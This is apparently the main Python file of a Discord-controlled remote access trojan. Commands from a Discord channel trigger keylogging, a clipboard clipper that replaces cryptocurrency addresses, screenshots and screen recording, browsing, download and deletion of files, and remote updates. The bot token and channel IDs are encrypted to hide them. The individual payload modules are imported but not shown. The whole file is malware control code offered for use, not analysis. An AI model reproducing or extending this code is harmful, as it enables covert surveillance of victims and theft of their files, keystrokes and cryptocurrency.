import discord
import sys
import asyncio
from discord.ext import commands
from cryptography.fernet import Fernet

# Global states for toggleable functions
clipper_active = False
input_monitor_active = False

def load_key():
    return open("encryption_key.key", "rb").read()

def decrypt_data(encrypted_data):
    key = load_key()
    cipher_suite = Fernet(key)
    return cipher_suite.decrypt(encrypted_data).decode()

# Encrypted credentials
ENCRYPTED_CHANNEL_ID = b'gAAAAABnEG9kv3tOHFjn3hUaTwDkL6BmKbXZH_bK4lW4_hhpl11woehIkY79vbbiELh46Cnes2R2YFpKnG5gA4ZvRPLJQHzBQN5rhOQmZ1sMurtydBMTXgc='
ENCRYPTED_BOT_TOKEN = b'gAAAAABnEG9kktOSgYwOqk6IAj9s0hDfDK9L9SNkVqlq4RoZrw_OFDNTZPB2Hlolu1Q4s3xsnM7Dj7eSfIypEYW6CbK3Esg16hUYrKfaq28K1I8aG7qEgOYkg_TBeA7qs0cLn03-2oJxUTIWmH1QtvL0UuBHnYsqAPUXOu-Rpu2i0Ls8I2mJs98='
ENCRYPTED_SERVER_ID = b'gAAAAABnEG9kRAfEUzPi9R1vplpy9zS6uZsPn_N0HjpFzOBTPVnwAOaTQcDjsHh7as312NcmDYKgSGVs76dkFcDJhkCCOsflkomqruZESKSs69dJLxk4U_o='

# Decrypt the channel ID, bot token, and server ID
CHANNEL_ID = int(decrypt_data(ENCRYPTED_CHANNEL_ID))
DISCORD_TOKEN = decrypt_data(ENCRYPTED_BOT_TOKEN)
SERVER_ID = int(decrypt_data(ENCRYPTED_SERVER_ID))

# Custom help command
class CustomHelpCommand(commands.HelpCommand):
    async def send_bot_help(self, mapping):
        embed = discord.Embed(title="**Functions Help**", description="Commands:", color=0xcd0000)

        embed.add_field(name="!browse <path>", value="Shows all directories and files in a path.", inline=False)
        embed.add_field(name="!clipper", value="Monitor clipboard contents, and replace crypto addresses.", inline=False)
        embed.add_field(name="!crypto <set, list>", value="Manage crypto addresses for the clipper.", inline=False)
        embed.add_field(name="!delete <path>", value="Deletes a file in a specified path.", inline=False)
        embed.add_field(name="!download <path>", value="Downloads a file in a specified path.", inline=False)
        embed.add_field(name="!drives", value="Lists the available drives on the system.", inline=False)
        embed.add_field(name="!inputs", value="Monitors keyboard inputs and sends them in randomized batches.", inline=False)
        embed.add_field(name="!screenshot", value="Takes a screenshot of the user's screen(s).", inline=False)
        embed.add_field(name="!usage", value="Displays system usage information and uptime.", inline=False)
        embed.add_field(name="!window", value="Lists the information of the window currently focused.", inline=False)

        channel = self.get_destination()
        await channel.send(embed=embed)

    async def send_command_help(self, command):
        pass  # Disable !help <command> functionality

# Bot setup using commands.Bot to allow for command handling
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=CustomHelpCommand())

# Separate lazy loading mechanism for toggleable functions
def lazy_load_toggleable_module(module_name, submodule_name=None):
    if submodule_name:
        module = __import__(f"{module_name}.{submodule_name}", fromlist=[submodule_name])
    else:
        module = __import__(module_name)
    return module

# Unload toggleable modules from memory
def unload_toggleable_module(module_name):
    if module_name in sys.modules:
        del sys.modules[module_name]

# Lazy loading for non-toggleable modules (one-time actions)
def lazy_load_module(module_name, submodule_name=None):
    if submodule_name:
        module = __import__(f"{module_name}.{submodule_name}", fromlist=[submodule_name])
    else:
        module = __import__(module_name)
    return module

# Unload non-toggleable modules
def unload_module(module_name):
    if module_name in sys.modules:
        del sys.modules[module_name]

@bot.event
async def on_ready():
    global CHANNEL_ID
    print(f"Logged in as {bot.user}")
    channel = bot.get_channel(CHANNEL_ID)
    if channel is None:
        print(f"Error: Could not access channel {CHANNEL_ID}. Please check permissions or channel ID.")
    else:
        print(f"Bot has access to channel: {channel.name}")

@bot.command(name="usage")
async def usage(ctx):
    system_usage = lazy_load_module('functions', 'system_usage')
    await system_usage.monitor_system(bot, CHANNEL_ID)
    unload_module('functions.system_usage')

@bot.command(name="inputs")
async def inputs(ctx):
    global input_monitor_active
    try:
        input_monitor_module = lazy_load_toggleable_module('functions', 'input_monitor')
        await input_monitor_module.toggle_input_monitor(bot, CHANNEL_ID, input_monitor_active)
        input_monitor_active = not input_monitor_active
        if not input_monitor_active:
            unload_toggleable_module('functions.input_monitor')
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name="screenshot")
async def screenshot(ctx):
    screenshot_module = lazy_load_module('functions', 'screenshot')
    await screenshot_module.capture_and_send(bot, CHANNEL_ID)
    unload_module('functions.screenshot')

@bot.command(name="record")
async def record(ctx):
    record_module = lazy_load_module('functions', 'record')
    await record_module.record_screen(bot, CHANNEL_ID)
    unload_module('functions.record')

@bot.command(name="clipper")
async def clipper(ctx):
    global clipper_active
    try:
        clipper_module = lazy_load_toggleable_module('functions', 'clipper')
        await clipper_module.toggle_clipper(bot, CHANNEL_ID, clipper_active)
        clipper_active = not clipper_active
        if not clipper_active:
            unload_toggleable_module('functions.clipper')
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command(name="crypto")
async def crypto(ctx, action, *, address=None):
    clipper_module = lazy_load_toggleable_module('functions', 'clipper')

    if action == "set" and address:
        await clipper_module.set_crypto_address(bot, ctx, address, clipper_active)
    elif action == "list":
        await clipper_module.list_crypto_addresses(bot, ctx, clipper_active)
    else:
        await ctx.send(f"**Usage:** `!crypto set <address>`, `!crypto list`")

@bot.command(name="delete", help="Deletes the specified file.")
async def delete(ctx, *, file_path: str):
    from functions.delete import delete_file
    file_path = file_path.replace("\\", "/")
    result_message = delete_file(file_path)
    await ctx.send(result_message)

@bot.command(name="window")
async def get_focused_window(ctx):
    from functions.window import get_focused_window_message

    message = get_focused_window_message()
    await ctx.send(message)

@bot.command(name="download")
async def download(ctx, *, file_path: str):
    from functions.download import download_and_send
    file_path = file_path.replace("\\", "/")
    await download_and_send(bot, CHANNEL_ID, file_path)

@bot.command(name="drives")
async def drives(ctx):
    from functions.file_browser import list_directory_contents
    await list_directory_contents(bot, CHANNEL_ID)

@bot.command(name="browse")
async def browse(ctx, *, path=None):
    from functions.file_browser import list_directory_contents, handle_navigation
    if path:
        await handle_navigation(bot, CHANNEL_ID, path)
    else:
        await list_directory_contents(bot, CHANNEL_ID)

@bot.command(name="update")
async def update(ctx):
    from functions.update import update_command
    await update_command(ctx)


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(f"**Error:** The command `{ctx.message.content}` was not found. Please use `!help` to see the list of available commands.")
    else:
        await ctx.send(f"**Error:** `{str(error)}`")

async def send_data_buffer(data, bot, CHANNEL_ID):
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        await channel.send(data)

def start_discord_bot():
    global bot_event_loop
    bot_event_loop = asyncio.get_event_loop()
    bot.run(DISCORD_TOKEN)
